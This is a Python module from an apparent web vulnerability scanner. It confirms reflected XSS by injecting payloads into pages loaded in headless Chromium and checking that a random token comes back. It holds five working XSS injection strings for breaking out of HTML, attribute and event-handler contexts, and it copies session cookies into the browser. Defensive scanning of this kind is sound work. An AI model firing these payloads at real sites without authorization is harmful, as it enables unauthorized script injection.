"""Stage 2 for XSS. Load the page in headless Chromium and check the script ran.

The payload sets a variable to a random token. Only if the browser hands
that token back is the finding confirmed. The browser does not go through
HttpClient, so the scope is checked here by hand.
"""
import html
import secrets
from urllib.parse import urlencode, urlparse

from playwright.sync_api import sync_playwright

from ..config import OutOfScopeError
from ..findings import Finding, Verdict

# The variable the payload sets. Long and specific so no real page has one.
PROOF_VAR = "__proofscan_xss"

# One payload per place the input might land. {token} is filled with a fresh
# random value each time, and the browser has to hand that exact value back.
PAYLOADS = [
    # dropped straight into the html
    '<script>window.{var}="{token}"</script>',
    # inside a double quoted attribute, break out of it first
    '"><script>window.{var}="{token}"</script>',
    # inside a single quoted attribute
    '\'><script>window.{var}="{token}"</script>',
    # script tags filtered, but an event handler still runs
    '<img src=x onerror=window.{var}="{token}">',
    # stuck inside an attribute with no way out, so stay there and use a handler
    # that fires on its own without anybody clicking anything
    '" onfocus=window.{var}=\'{token}\' autofocus x="',
]

# Same five places as PAYLOADS, same order. Used after a proof to get a picture
# of the injected script itself drawing on the page. {js} comes from SHOW_STEPS.
SHOW_PAYLOADS = [
    "<script>{js}</script>",
    '"><script>{js}</script>',
    "'><script>{js}</script>",
    "<img src=x onerror={js}>",
    '" onfocus={js} autofocus x="',
]

PAGE_TIMEOUT_MS = 15000
VIEWPORT = {"width": 1024, "height": 640}


def cookies_from(client, base_url):
    """Copy the logged in session from the http client into Chromium.

    By url rather than domain: cookies set with --cookie have no domain and
    would be dropped without a word (DVWA's security=low is one).
    """
    latest = {}
    for cookie in client._client.cookies.jar:
        latest[cookie.name] = cookie.value
    return [{"name": name, "value": value, "url": base_url}
            for name, value in latest.items()]


# No spaces, quotes, < > or backslashes (DVWA strips them), and short: DVWA keeps
# 300 characters of a message and 100 of a name, hence the red page fallback.

def box_js(token):
    return (f"{PROOF_VAR}=`{token}`;_b=document.createElement(`h2`);"
            "_b.textContent=`ProofScan:_this_box_was_drawn_by_injected_code`"
            ".replace(/_/g,String.fromCharCode(32));"
            "_b.style.cssText=`background:red;color:#fff;padding:9px`;"
            "document.body.prepend(_b)")


def red_page_js(token):
    return f"{PROOF_VAR}=`{token}`;document.body.style.background=`red`"


SHOW_STEPS = [
    (box_js, "The injected script ran and drew the red box"),
    (red_page_js, "The injected script ran and turned the page red"),
]


class BrowserProver:
    """One Chromium for the whole scan, since starting one takes about a second."""

    def __init__(self, scope, cookies=None):
        self.scope = scope
        self.cookies = cookies or []
        self._pw = None
        self._browser = None
        self._context = None
        self.pages_loaded = 0

    def __enter__(self):
        self._pw = sync_playwright().start()
        self._browser = self._pw.chromium.launch(headless=True)
        self._context = self._browser.new_context(viewport=VIEWPORT)
        if self.cookies:
            self._context.add_cookies(self.cookies)
        return self

    def __exit__(self, *exc):
        for closer in (self._context, self._browser):
            try:
                closer.close()
            except Exception:
                pass
        try:
            self._pw.stop()
        except Exception:
            pass

    def _url_for(self, point, payload):
        params = point.base_params()
        params[point.param] = payload
        return f"{point.url}?{urlencode(params)}"

    def ran(self, point, payload, token, shot=False):
        """Load the payload and check the script ran. shot=True also screenshots into last_shot."""
        self.last_shot = None
        page = self._context.new_page()
        # a payload that opens a dialog would otherwise sit there forever
        page.on("dialog", lambda d: d.dismiss())
        try:
            if point.method == "POST":
                self._submit_form(page, point, payload)
            else:
                url = self._url_for(point, payload)
                if not self.scope.allows(url):
                    raise OutOfScopeError(f"out of scope: {url}")
                page.goto(url, timeout=PAGE_TIMEOUT_MS, wait_until="load")

            self.pages_loaded += 1
            if shot:
                # the onfocus payload fires a moment after load
                try:
                    page.wait_for_function(f"window.{PROOF_VAR} === '{token}'", timeout=2000)
                except Exception:
                    pass
                self.last_shot = _screenshot(page)
            return page.evaluate(f"window.{PROOF_VAR} || null") == token
        finally:
            try:
                page.close()
            except Exception:
                pass

    def render(self, url, response):
        """Show a response we already have in the browser and screenshot it.

        Css and images still load from the target, in scope only.
        """
        if not self.scope.allows(url):
            raise OutOfScopeError(f"out of scope: {url}")
        served = []

        def route(r):
            if r.request.is_navigation_request() and not served:
                served.append(1)
                r.fulfill(status=response.status or 200, body=response.body,
                          content_type=_content_type(response))
            elif self.scope.allows(r.request.url):
                r.continue_()
            else:
                r.abort()

        page = self._context.new_page()
        page.on("dialog", lambda d: d.dismiss())
        try:
            page.route("**/*", route)
            page.goto(url, timeout=PAGE_TIMEOUT_MS, wait_until="load")
            return _screenshot(page)
        finally:
            try:
                page.close()
            except Exception:
                pass

    def _submit_form(self, page, point, payload):
        """POST the payload by building a form and submitting it, so the response gets rendered."""
        if not self.scope.allows(point.url):
            raise OutOfScopeError(f"out of scope: {point.url}")

        params = point.base_params()
        params[point.param] = payload
        inputs = "".join(
            f'<input name="{html.escape(str(k), quote=True)}" '
            f'value="{html.escape(str(v), quote=True)}">'
            for k, v in params.items()
        )
        page.set_content(
            f'<form id="pf" method="post" action="{html.escape(point.url, quote=True)}">'
            f"{inputs}</form><script>document.getElementById('pf').submit()</script>"
        )
        page.wait_for_load_state("load", timeout=PAGE_TIMEOUT_MS)


def _screenshot(page):
    # cut to the content, so a short page is not a picture of mostly white
    try:
        height = page.evaluate("document.body ? document.body.scrollHeight : 0")
        height = max(160, min(VIEWPORT["height"], height + 24))
        return page.screenshot(type="png", clip={"x": 0, "y": 0,
                                                 "width": VIEWPORT["width"], "height": height})
    except Exception:
        return None


def _content_type(response):
    headers = {k.lower(): v for k, v in (response.headers or {}).items()}
    return headers.get("content-type", "text/html")


def picture_of_run(prover, point, index):
    """After a proof, send the visible version and screenshot it.

    Kept only if its own token comes back. Never changes the verdict.
    """
    for make_js, label in SHOW_STEPS:
        token = "pf" + secrets.token_hex(8)
        payload = SHOW_PAYLOADS[index].format(js=make_js(token))
        try:
            ran = prover.ran(point, payload, token, shot=True)
        except OutOfScopeError:
            raise
        except Exception:
            continue
        if ran and prover.last_shot:
            return {"label": f"{label} ({token})", "png": prover.last_shot}
    return None


def validate(prover, point, reason):
    attempts = []
    first_shot = None

    for index, template in enumerate(PAYLOADS):
        token = "pf" + secrets.token_hex(8)
        payload = template.format(var=PROOF_VAR, token=token)

        try:
            executed = prover.ran(point, payload, token, shot=index == 0)
            if index == 0:
                first_shot = prover.last_shot
        except OutOfScopeError:
            raise
        except Exception as e:
            attempts.append({"payload": payload, "result": f"could not load: {e}"})
            continue

        if executed:
            shot = picture_of_run(prover, point, index)
            return Finding(
                "xss", point, Verdict.CONFIRMED,
                "the injected script ran in a real browser",
                {
                    "detector_reason": reason,
                    "technique": "browser",
                    "proof": {
                        "payload": payload,
                        "token": token,
                        "variable": f"window.{PROOF_VAR}",
                        "read_back": token,
                    },
                    "attempts": attempts,
                },
                screenshots=[shot] if shot else [],
            )

        attempts.append({"payload": payload, "result": "loaded, but nothing ran"})

    shots = []
    if first_shot:
        shots.append({"label": "How the browser showed the page with the first "
                               "payload in it. Nothing ran.",
                      "png": first_shot})
    return Finding("xss", point, Verdict.REJECTED,
                   f"input comes back, but none of the {len(PAYLOADS)} payloads "
                   f"executed in a browser",
                   {"detector_reason": reason, "technique": "browser",
                    "attempts": attempts},
                   screenshots=shots)
